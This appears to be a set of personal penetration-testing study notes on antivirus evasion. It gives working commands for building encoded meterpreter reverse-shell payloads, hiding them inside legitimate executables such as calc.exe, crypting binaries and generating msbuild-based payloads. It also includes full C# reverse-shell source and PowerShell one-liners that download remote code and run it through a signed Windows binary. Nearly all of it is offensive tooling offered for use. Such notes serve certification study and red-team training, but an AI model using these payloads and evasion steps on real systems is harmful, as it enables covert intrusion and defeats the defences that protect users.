# Basic

+ [sushan747 - bypassing antivirus](https://sushant747.gitbooks.io/total-oscp-guide/content/bypassing_antivirus.html)
+ [hacktricks - bypass av](https://book.hacktricks.xyz/windows/av-bypass)

**official course**
17.3  outside of the scope of this module.
p494
powershell executionpolicy error

```
At line:1 char:1
+ .\av_test.ps1
+ ~~~~~~~~~~~~~
+ CategoryInfo : SecurityError: (:) [], PSSecurityException
+ FullyQualifiedErrorId : UnauthorizedAccess

C:\Users\offsec\Desktop> powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Undefined
PS C:\Users\offsec\Desktop> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Unrestricted
```

# Encoding
+ encode the payload
+ msfvenom -e
```bash
msfvenom -l encoders

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=5555 -f exe -e
x86/shikata_ga_nai -i 9 -o meterpreter_encoded.exe
```

# Embed in non-malicious file

## shellter 

```
sudo apt install shellter
sudo apt install wine 
//wine 安装 i386
dpkg --add-architecture i386 && apt-get update && apt-get install wine32

shellter
// injection  https://www.cnblogs.com/hkleak/p/12912706.html?ivk_sa=1024320u
automode
set exe file
injection 
set tcp_reverse meterpreter
set host and port
```

## msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=5555 -f exe -e x86/shikata_ga_nai -i 9 -x calc.exe -o bad_calc.exe
```

# msf migrate
msf migrate windows meterpreter
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
show option
set lhost 192.168.119.196
//migrate meterpreter to another process after session create
set AutoRunScript post/windows/manage/migrate   
exploit
```

# malware encrypt
+ encrypt to obfuscate the payload/malware, change the signature

```bash
# install
wget https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip
unzip Hyperion-1.2.zip
i686-w64-mingw32-c++ Hyperion-1.2/Src/Crypter/*.cpp -o hyperion.exe

# kali path
/usr/share/veil-evasion/tools/hyperion

# encrypt
wine hyperion /path/to/file.exe encryptedfile.exe
```

# GreatSCT
+ download from [git](https://github.com/GreatSCT/GreatSCT)

```bash
# install
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py

# usage, inside greatsct
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole

# start listen 
msfconsole -r file.rc

# execute payload
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

# Compile own shell
+ [undetectable C#&C++ reverse shells](https://bank-security.medium.com/undetectable-c-c-reverse-shells-fab4c0ec4f15)


## c# revershell

```bash
# compile
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt

# use 
back.exe [attackip] [port]
```

**c# code**
```c#
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

## C# using compiler
+ rev.txt, https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066
+ rev.shell, https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639
+ c# obfuscators list, https://github.com/NotPrab/.NET-Obfuscator

```bash
# auto down and execute
## 64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

## 32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

```

## C++ 

```bash
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

```

# other tools

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless: 
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload: 
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut: 
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan

```
